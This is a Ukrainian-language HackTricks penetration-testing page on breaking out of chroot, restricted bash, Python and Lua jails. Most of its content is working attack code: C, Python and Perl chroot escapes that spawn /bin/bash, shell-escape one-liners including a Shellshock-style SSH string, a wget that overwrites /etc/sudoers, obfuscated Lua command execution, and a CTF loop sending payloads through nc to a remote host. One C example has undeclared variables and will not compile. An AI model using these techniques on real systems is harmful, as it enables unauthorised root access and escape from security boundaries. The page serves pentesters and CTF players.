# Втеча з в'язниці

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>
{% endhint %}

## **GTFOBins**

**Шукайте на** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **можливість виконання будь-якого виконуваного файлу з властивістю "Shell"**

## Втеча з Chroot

З [вікіпедії](https://en.wikipedia.org/wiki/Chroot#Limitations): Механізм chroot **не призначений для захисту** від умисного втручання **привілейованими** (**root**) **користувачами**. На більшості систем контексти chroot не правильно стекаються, і програми, які працюють у chroot з достатніми привілеями, можуть виконати другий chroot, щоб вийти.\
Зазвичай це означає, що для втечі вам потрібно бути root всередині chroot.

{% hint style="success" %}
**Інструмент** [**chw00t**](https://github.com/earthquake/chw00t) був створений для зловживання наступними сценаріями та втечі з `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Якщо ви **root** всередині chroot, ви **можете втекти**, створивши **інший chroot**. Це тому, що 2 chroot не можуть існувати одночасно (у Linux), тому якщо ви створите папку, а потім **створите новий chroot** у цій новій папці, бувши **поза ним**, ви тепер будете **поза новим chroot** і, отже, ви будете в ФС.

Це трапляється, оскільки зазвичай chroot НЕ переміщує вашу робочу директорію до вказаної, тому ви можете створити chroot, але бути поза ним.
{% endhint %}

Зазвичай ви не знайдете бінарний файл `chroot` всередині в'язниці chroot, але ви **можете скомпілювати, завантажити та виконати** бінарний файл:
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Перл</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Збережений fd

{% hint style="warning" %}
Це схоже на попередній випадок, але в цьому випадку **зловмисник зберігає файловий дескриптор у поточному каталозі**, а потім **створює chroot у новій папці**. Нарешті, оскільки він має **доступ** до цього **FD** **поза** chroot, він отримує до нього доступ і **вибирається**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD може бути переданий через Unix Domain Sockets, тому:

* Створити дочірній процес (fork)
* Створити UDS, щоб батько і дитина могли спілкуватися
* Запустити chroot у дочірньому процесі в іншій папці
* У батьківському процесі створити FD папки, яка знаходиться поза новим chroot дочірнього процесу
* Передати цей FD дочірньому процесу за допомогою UDS
* Дочірній процес змінює поточну директорію на цей FD, і через те, що вона знаходиться поза його chroot, він вибереться з в'язниці
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Монтування кореневого пристрою (/) в каталог всередині chroot
* Chroot в цей каталог

Це можливо в Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Монтування procfs в каталог всередині chroot (якщо ще не)
* Шукайте pid, у якого інший корінь/поточна директорія, наприклад: /proc/1/root
* Chroot в цей запис
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Створити Fork (дочірній процес) і chroot в іншу папку глибше в FS та CD на неї
* З батьківського процесу перемістіть папку, де знаходиться дочірній процес, в папку перед chroot дітей
* Цей дочірній процес виявить себе поза chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Колись користувачі могли налагоджувати власні процеси з процесу самого себе... але це більше не можливо за замовчуванням
* У будь-якому випадку, якщо це можливо, ви можете використовувати ptrace в процесі та виконати shellcode всередині нього ([див. цей приклад](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Отримати інформацію про в'язницю:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Зміна PATH

Перевірте, чи можете ви змінити змінну середовища PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Використання vim
```bash
:set shell=/bin/sh
:shell
```
### Створення скрипту

Перевірте, чи можете ви створити виконуваний файл з вмістом _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Отримання bash з SSH

Якщо ви отримуєте доступ через ssh, ви можете скористатися цим трюком для виконання оболонки bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Оголошення
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Ви можете перезаписати, наприклад, файл sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Інші трюки

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Також може бути цікавою сторінка:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Трюки щодо виходу з Python в'язниць наступної сторінки:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

На цій сторінці ви можете знайти глобальні функції, до яких у вас є доступ всередині Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Оцінка з виконанням команд:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Деякі трюки для **виклику функцій бібліотеки без використання крапок**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Перерахуйте функції бібліотеки:
```bash
for k,v in pairs(string) do print(k,v) end
```
Зверніть увагу, що кожного разу, коли ви виконуєте попередню однорядкову команду в **різному середовищі lua, порядок функцій змінюється**. Тому, якщо вам потрібно виконати одну конкретну функцію, ви можете виконати атаку методом грубої сили, завантажуючи різні середовища lua та викликаючи першу функцію бібліотеки le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Отримати інтерактивну lua оболонку**: Якщо ви знаходитесь всередині обмеженої lua оболонки, ви можете отримати нову lua оболонку (і, сподіваємося, необмежену), викликавши:
```bash
debug.debug()
```
## Посилання

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Слайди: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Вивчайте та практикуйте взлом AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
